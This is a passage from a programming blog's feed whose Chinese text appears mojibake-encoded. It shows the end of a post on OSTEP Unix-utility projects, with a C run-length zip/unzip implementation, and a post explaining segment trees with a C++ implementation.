class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">++</span>cnt<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cnt <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cnt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ch<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ch <span class="token operator">=</span> buffer<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>cnt <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cnt <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cnt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ch<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="wunzip"><a href="#wunzip" class="headerlink" title="wunzip"></a>wunzip</h1><h2 id="æ€è·¯-3"><a href="#æ€è·¯-3" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ç›¸è¾ƒäºç¼–ç ï¼Œè§£ç å°±ç®€å•å¾ˆå¤šäº†ã€‚ä½¿ç”¨ <code>fread()</code> æ¯æ¬¡è¯»å–ä¸€ä¸ªæ•´æ•° cnt å’Œä¸€ä¸ªå­—ç¬¦ chï¼Œå¹¶ä½¿ç”¨ for å¾ªç¯æ‰“å° cnt ä¸ª ch åˆ°æ ‡å‡†è¾“å‡ºå³å¯ã€‚</p><h2 id="ä»£ç -3"><a href="#ä»£ç -3" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wunzip: file1 [file2 ...]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> ch <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> rc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wunzip: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>rc <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cnt<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>rc <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ch<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> cnt<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ¬æ–‡å°†ä»‹ç»æ“ä½œç³»ç»Ÿå¯¼è®ºï¼ˆOperating Systems: Three Easy Piecesï¼‰ä½œè€…æ‰€å¼€æºçš„æ“ä½œç³»ç»Ÿç›¸å…³&lt;a href=&quot;https://github.com/remzi-arpacidusseau/ostep-projects&quot;&gt;è¯¾ç¨‹é¡¹ç›®&lt;/a&gt; çš„ Unix Utilities éƒ¨åˆ†ï¼ŒåŒ…å«ä¸ªäººçš„ä»£ç å®ç°å’Œè®¾è®¡æ€è·¯ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="Linux" scheme="http://lordaeronesz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>é«˜æ•ˆçš„åŒºé—´äºŒå‰æœç´¢æ ‘ï¼šçº¿æ®µæ ‘</title>
    <link href="http://lordaeronesz.github.io/2024/03/18/%E9%AB%98%E6%95%88%E7%9A%84%E5%8C%BA%E9%97%B4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%9A%E7%BA%BF%E6%AE%B5%E6%A0%91/"/>
    <id>http://lordaeronesz.github.io/2024/03/18/%E9%AB%98%E6%95%88%E7%9A%84%E5%8C%BA%E9%97%B4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%9A%E7%BA%BF%E6%AE%B5%E6%A0%91/</id>
    <published>2024-03-18T01:03:08.000Z</published>
    <updated>2024-03-18T06:52:41.187Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸æ ‘çŠ¶æ•°ç»„ç±»ä¼¼ï¼Œçº¿æ®µæ ‘ä¹Ÿæ˜¯ä¸€ç§ç”¨æ¥ç»´æŠ¤åŒºé—´ä¿¡æ¯çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥åœ¨å¯¹æ•°æ—¶é—´å¤æ‚åº¦å†…å®ç°æ›´æ–°å’ŒæŸ¥è¯¢ç­‰æ“ä½œã€‚ä½†ç›¸è¾ƒäºæ ‘çŠ¶æ•°ç»„å¤šç”¨äºå‰ç¼€å’ŒæŸ¥è¯¢ä¸åŒï¼Œçº¿æ®µæ ‘çš„åº”ç”¨èŒƒå›´æ›´ä¸ºå¹¿æ³›ï¼Œä¾‹å¦‚åŒºé—´æœ€å€¼ç­‰é—®é¢˜ï¼Œä»£ä»·æ˜¯éœ€è¦æ¶ˆè€—æ›´å¤šçš„å­˜å‚¨ç©ºé—´ã€‚</p><span id="more"></span><h1 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h1><p>å¯¹äºä¸€ä¸ªé•¿åº¦ä¸º 7 çš„æ•°ç»„ï¼Œæ ¹æ®è¯¥æ•°ç»„ nums å…ƒç´ å»ºç«‹çš„çº¿æ®µæ ‘ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p>æ¯ä¸ªç»“ç‚¹å­˜å‚¨çš„å€¼ä¸ºåŒºé—´ <code>nums[L ~ R]</code> çš„å…ƒç´ å’Œï¼Œå…¶ä¸­æ ¹èŠ‚ç‚¹å¯¹åº”çš„ L = 0, R = 6ï¼Œå³æ•´ä¸ªæ•°ç»„çš„å…ƒç´ å’Œã€‚ç„¶åæ¯ä¸€å±‚çš„ç»“ç‚¹å°†åŒºé—´å‡åˆ†ä¸º <code>[L, (L + R) / 2]</code> å’Œ <code>[(L + R) / 2 + 1, R]</code> ä¸¤éƒ¨åˆ†ã€‚æ³¨æ„æŒ‰æ­¤æ–¹å¼è¿›è¡Œåˆ’åˆ†ï¼Œå¾—åˆ°çš„ä¸¤ä¸ªå­åŒºé—´å§‹ç»ˆæ»¡è¶³ï¼šå·¦å³åŒºé—´é•¿åº¦åˆ†åˆ«ä¸º len1 å’Œ len2ï¼Œä¸” <code>len1 == len2 || len1 == len2 + 1</code>ã€‚ä¸éš¾å¾—çŸ¥ï¼šè¿™æ ·çš„ç»“æ„æ„æˆä¸€ä¸ª<strong>å®Œå…¨äºŒå‰æ ‘</strong>ï¼Œå› æ­¤ä½¿ç”¨é¡ºåºå­˜å‚¨å°†ä¼šå˜å¾—å¾ˆæ–¹ä¾¿ï¼šæ ¹èŠ‚ç‚¹ä¸‹æ ‡ä¸º 0ï¼›å¯¹äºæ¯ä¸ªä¸‹æ ‡ä¸º idx çš„ç»“ç‚¹ï¼Œå…¶å·¦å­©å­ä¸‹æ ‡ä¸º <code>2 * idx + 1</code>ï¼Œå³å­©å­ä¸‹æ ‡ä¸º <code>2 * idx + 2</code>ã€‚</p><p><img src="/2024/03/18/%E9%AB%98%E6%95%88%E7%9A%84%E5%8C%BA%E9%97%B4%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%EF%BC%9A%E7%BA%BF%E6%AE%B5%E6%A0%91/tree.jpg"></p><h1 id="æ„é€ "><a href="#æ„é€ " class="headerlink" title="æ„é€ "></a>æ„é€ </h1><p>ç”±äºå¶å­ç»“ç‚¹çš„ L å’Œ R ç›¸ç­‰ï¼Œå…¶å€¼æ­£å¥½ä¸º <code>nums[L]</code>ï¼Œè€Œæ¯ä¸ªçˆ¶ç»“ç‚¹çš„å€¼ä¸ºå…¶ä¸¤ä¸ªå­ç»“ç‚¹çš„å€¼ä¹‹å’Œï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨åŠ¨æ€è§„åˆ’çš„æ€æƒ³ï¼Œå…ˆå°†æ¯ä¸ªå¶å­ç»“ç‚¹çš„å€¼æ±‚å‡ºï¼Œå†ä¾æ¬¡æ±‚å‡ºå…¶å¯¹åº”çš„çˆ¶ç»“ç‚¹çš„å€¼ï¼Œæœ€ç»ˆå®Œæˆçº¿æ®µæ ‘çš„å»ºç«‹ã€‚</p><p>æœ‰ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„ç»†èŠ‚å°±æ˜¯å…³äºçº¿æ®µæ ‘æ•°ç»„ tree çš„é•¿åº¦é—®é¢˜ã€‚è‹¥çº¿æ®µæ ‘æ­£å¥½æ„æˆä¸€ä¸ª<strong>æ»¡äºŒå‰æ ‘</strong>ï¼Œé‚£ä¹ˆæ ‘çš„æ·±åº¦ï¼ˆä»¤æ ¹ç»“ç‚¹æ·±åº¦ä¸º 1ï¼‰ä¸º logm + 1ï¼ˆm ä¸º nums é•¿åº¦ï¼Œæ­£å¥½ä¸º 2 çš„å¹‚ï¼‰ï¼Œåˆ™å½“ nums çš„é•¿åº¦ä¸º n ï¼ˆn ä¸ºä»»æ„æ­£æ•´æ•°ï¼‰æ—¶ï¼Œæ ‘çš„æ·±åº¦ä¸º âŒˆlognâŒ‰ + 1. </p><p>è‹¥ç»™æ ‘æœ€åº•å±‚çš„ç©ºç»“ç‚¹ä¹Ÿåˆ†é…ç©ºé—´ï¼Œåˆ™ç»“ç‚¹æ€»æ•° cnt = 2<sup>âŒˆlognâŒ‰ + 1</sup> - 1.</p><p>ä»¤ n = 2<sup>x</sup>ï¼Œæœ‰ cnt = 2 * 2<sup>x</sup> - 1 = 2 * n - 3.</p><p>ä»¤ n = 2<sup>x</sup> + 1ï¼Œæœ‰ cnt = 4 * 2<sup>x</sup> - 1 = 4 * n - 5.</p><p>å¯è§å§‹ç»ˆæœ‰ cnt &lt; 4 * nï¼Œå› æ­¤ä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œé€šå¸¸æƒ…å†µä¸‹ç›´æ¥ä»¤ tree çš„é•¿åº¦ä¸º 4 * n.</p><h1 id="æŸ¥è¯¢"><a href="#æŸ¥è¯¢" class="headerlink" title="æŸ¥è¯¢"></a>æŸ¥è¯¢</h1><p>æŸ¥è¯¢åŒºé—´ <code>nums[p ~ q]</code> çš„å…ƒç´ å’Œæ—¶ï¼Œè‹¥æ­£å¥½å¯ä»¥æŸ¥è¯¢åˆ°å½“å‰ç»“ç‚¹ node å¯¹åº”çš„åŒºé—´ä¸º <code>[L, R]</code> ä¸”æœ‰ <code>L == p &amp;&amp; R == q</code>ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„ <code>tree[node]</code> å³ä¸ºæ‰€è¦æŸ¥æ‰¾çš„åŒºé—´å’Œï¼Œç›´æ¥è¿”å›å³å¯ï¼›</p><p>å¦åˆ™å¯å°†å…¶è¿›è¡Œæ‹†åˆ†ä¸ºä¸¤ä¸ªå­åŒºé—´ï¼ŒæŸ¥æ‰¾è¿™ä¸¤ä¸ªå­åŒºé—´çš„å€¼ï¼Œå°†å…¶æ±‚å’Œåè¿”å›ã€‚å¦‚éœ€è¦æŸ¥æ‰¾ <code>nums[2 ~ 4]</code> çš„å…ƒç´ å’Œï¼Œå¯å°†å…¶åˆ’åˆ†ä¸º <code>nums[2 ~ 3] + nums[4 ~ 4]</code>ï¼Œåˆ†åˆ«åœ¨æ ¹èŠ‚ç‚¹çš„å·¦å³ä¸¤ä¸ªå­æ ‘ä¸­æŸ¥æ‰¾ã€‚</p><h1 id="æ›´æ–°"><a href="#æ›´æ–°" class="headerlink" title="æ›´æ–°"></a>æ›´æ–°</h1><p>æ›´æ–°ä¸æ„é€ åšæ³•ç±»ä¼¼ï¼ŒåŒæ ·æ˜¯å…ˆä¿®æ”¹å¶å­èŠ‚ç‚¹ï¼Œå†ä¾æ¬¡å‘ä¸Šä¿®æ”¹ã€‚</p><p>ä¸åŒä¹‹å¤„åœ¨äºæ›´æ–°æ¯æ¬¡åªéœ€è¦å¤„ç†ä¸€ä¸ªåˆ†æ”¯ï¼Œæ—¶é—´å¼€é”€ T(n) = T(n / 2) + O(1)ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(logn)ï¼›è€Œæ„é€ æ—¶å·¦å³å­æ ‘å‡éœ€è¦å¤„ç†ï¼Œæ—¶é—´å¼€é”€ T(n) = 2 * T(n / 2) + O(1)ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(n).</p><h1 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">segmentTree</span> <span class="token punctuation">&#123;</span><span class="token keyword">private</span><span class="token operator">:</span><span class="token keyword">int</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> tree<span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span><span class="token function">segmentTree</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">n</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">tree</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> build <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>low <span class="token operator">==</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token function">build</span><span class="token punctuation">(</span>node <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">build</span><span class="token punctuation">(</span>node <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">changeVal</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>function<span class="token operator">&lt;</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> change <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>low <span class="token operator">==</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> tree<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">rangeSum</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>function<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">></span> range <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> node<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">int</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">==</span> low <span class="token operator">&amp;&amp;</span> r <span class="token operator">==</span> high<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> tree<span class="token punctuation">[</span>node<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">></span> mid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">range</span><span class="token punctuation">(</span>mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> node <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">range</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>]]></content>
    
    
